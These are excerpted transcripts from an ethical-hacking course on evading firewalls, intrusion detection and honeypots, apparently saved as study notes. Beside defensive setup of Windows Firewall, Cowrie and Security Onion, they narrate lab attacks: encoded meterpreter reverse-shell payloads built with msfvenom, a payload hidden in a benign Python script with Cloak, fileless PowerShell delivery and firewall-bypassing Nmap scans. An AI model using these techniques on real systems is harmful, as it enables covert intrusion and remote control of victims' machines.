...
>
> **[2:45](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980&t=165)** If I press Network types, we can see that the [[Microsoft]] firewall defaults new programs to the private network only. That's fine, so let's now press OK, and then Add. And we can see our selected program has been added. We can press OK now and close this screen. So Windows Firewall allows us to control which programs can accept connections from another computer when we're on our home network and which connections are accepted when we go out with our laptop and connect to a public network. Most computers come with a network communications tool called [[Netcat]], which we can use to communicate between two computers, one being a sender and the other a listener. I'll use this program to demonstrate the features of the Windows Firewall by communicating to this computer remotely.
>
...
>
> **[7:07](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=427)** Again, I'll apply the change. Okay, let's see what effect these changes make. Okay, let's set up the netcat listener again and I'll now try to connect from Kali. We get the response as expected. I'll now try to connect from my [[Ubuntu]] system. I can see I'm on IP address 10.0.2.12.
>
...
>
> **[3:09](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980&t=189)** If you have problems getting Ping to work, you may want to wait a minute or so to let it synchronize. Failing that, you may need to take down your network and start it up again. GNS3 can sometimes be a little fussy when first introducing Kali, but once settled it works well. We can now run [[Nmap]] against the ASA. We can see that all the ports are filtered. There's nothing to see, and Nmap can't identify the operating system. Let's start Armitage and see if we have any more luck with that. We first need to start [[PostgreSQL|Postgres]].
>
...
> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/run-the-cowrie-honeypot?u=76281980&t=0)** - [Instructor] I've made a clone of my [[Ubuntu]] system and run APT Get update and APT Get upgrade to get it up to date. Installing Cowrie is fairly straightforward, although there are some dependency issues that you might encounter. We'll start by installing the main library dependencies.
>
...
> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=0)** - [Instructor] Network [[Intrusion Detection]] systems occur on the perimeter as well as inside networks and their purpose is to detect threats by monitoring network traffic. There are both opensource and commercial solutions available. Intrusion detection systems work either by detecting exploit in malware signatures or by detecting behavior that looks anomalous or maybe associated with an intrusion. Snort is an opensource intrusion detection system which has been the genesis of many of the intrusion detection systems available today and Snort rules are accepted as an industry standard for configuring intrusion detection systems. It's a command line tool and uses signatures as well as anomaly detection. Suricata is a development that came from the U.S. Department of Homeland Security funding as a contemporary alternative to Snort and is well-regarded also. The tool we're going to look at is called Security Onion. This is a [[Ubuntu]] idea which combines the best of Snort, Suricata, and other IDS initiatives and provides a comprehensive intrusion detection, [[Network Security]] monitoring, and log management solution. The download link points to [[GitHub]] and we can get the latest ISO image from there. I'll create a new Ubuntu 64-bit virtual machine and configure it with two gigabytes of RAM and 20 gig VDI hard disk.
>
...
> [!transcript]- Transcript
>
> **[0:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980&t=1)** - [Instructor] [[Nmap]] is often used to run a scan of the ports on a target. Internet connected systems are required by the internet standard RFC 793 to send a negative response to unexpected connections in the form of a TCP reset packet. This makes it easy for Nmap to recognize closed ports. When scanning through a firewall, packets destined for a disallowed port will either be dropped or the firewall will return a port unreachable response. These responses enable Nmap to reliably detect filtered TCP ports from open or closed ones. However, a filtered or unreachable port doesn't always mean the port is inaccessible. One reason a scan is detected and blocked is that it might run too fast. Let's use Nmap to scan our Kali-eminence server on 192.168.1.187. And we get a pretty quick response with the open ports.
>
...
>
> **[3:06](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980&t=186)** but that might not be the case with some targets. Another option for scanning, if our normal scan fails, is to use a different scan type. We can use null scans, Xmas scans, ICMP echo scans, and more. One particularly useful approach, when we have access to a dual-homed target, is to bounce our scan off that target in order to access a network that it has access to, but which we can't reach directly. We can do this with what's known as a loose source [[Routing]] scan using Nmap's IP options. To demonstrate this, I'll run it on the same network but if we were using it for real, we'd use the target subnet as the reason. Nmap -sn to do a scan of the subnet,
>
> **[3:52](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980&t=232)** - -IP-options, and the option we use is the L prefix on the host 192.168.1.51. We'll bounce this off our [[Hydra]] server and for the reason we'll put 192.168.1.0/24
>
...
> [!transcript]- Transcript
>
> **[0:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obfuscating-payloads-with-msfvenom?u=76281980&t=1)** - [Instructor] When creating a payload, we need to make sure that it isn't detected as malicious by the target's firewall or IDS system. To demonstrate how to do this, we'll create an obfuscated payload using the [[Metasploit|msfvenom]] tools encoding capability. We can select one of a number of ways to obfuscate the payload. We do this by invoking an encoder and we can list out the possible encoders by msfvenom --list encoders.
>
> **[0:34](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obfuscating-payloads-with-msfvenom?u=76281980&t=34)** Okay, there's a few there, and we can see the shikata_ga_nai is reported to be an excellent encoder, so we'll use that one. Meterpreter can create many different types of payload for a range of targets. We'll create a Meterpreter reverse TCP payload for [[Windows]] X86, msfvenom -p windows/meterpreter/reverse_tcp
>
...
> [!transcript]- Transcript
>
> **[0:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=1)** - [Instructor] It can be difficult to obfuscate scripted malware as it needs to be in readable form to execute. There are tricks that can be used to achieve this, however. Let's have a look at tool by Somdev which cloaks a [[Python (Programming Language)|Python]] payload by creating and injecting it into a benign Python script. I've downloaded the script, so let's take a look at it. Nano cloak.py -l. I won't analyze this in detail but there are some interesting aspects to look at. At line 32, the script makes a connection to the [[Google]] DNS in order to find the IP address it's running from. At line 47, we can see a call to check that [[Metasploit|msfvenom]] is available on the host. And at lines 53 and 58, it get the IP and port from the user. The injector starts at line 124 and at line 127, we can see the msfvenom call that's made for a python/meterpreter shell across HTTPS, saving the payload into a file called payload.txt. This is then read in at lines 130 to 132 and the injection starts. There's a couple of changes I've already done to correct some deliberate mistakes in the code. The first is at line 136. We need to use the seventh element, not the third or fourth. The second is at line 182
>
> **[1:34](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=94)** to set root defaults before checking. Okay, we're good to go. I've got a useful Python script to list [[Wi-Fi]] passwords called wifipw.py. Let's take a look at it. Nano wifipw.py -l. Again, I won't go into the script in detail as it's really just a carrier but we can see at line nine that it's reading one of the network manager files and then iterating around entries. We can run this on our VM. Python3 wifipw.py and we just get the wired connection.
>
> **[2:16](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=136)** That will do. Let's now inject a Python payload into this with Cloak. Python3 cloak.py. Okay, we've got our IP address, use 443 as the port, and we'll use wifipw.py as the carrier. Cloak generates the payload. And we don't need to run the injected script as root. Let's now have a look at our wifipw script. Nano wifipw.py. We can now see that there's some base64 characters in strings at the start of the script. This is our payload split into two chunks and at line 13, we execute it. Okay, let's run this. The first thing we'll do is open a new terminal and set up a [[Metasploit]] listener. We'll run sudo [[Metasploit|msfconsole]] as we'll want to listen on a low-numbered port. We'll select the multi/handler. Use exploit/multi/handler and we'll select the payload type that we've built. Set payload to python/meterpreter/reverse_https.
>
...
>
> **[1:02](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980&t=62)** LPORT=80 for HTTP and we'll output the file to m64.ps1 as a PowerScript shell. Okay, we now need to serve this on a website. So let's use our [[Python (Programming Language)|Python]] simple HTTP server. Python -M SimpleHTTPServer. Now we need to set up a meterpreter listener for PowerShell. So in our second terminal, we'll run sudo [[Metasploit|msfconsole]], as we need to set up a listener on a low-numbered port.
>
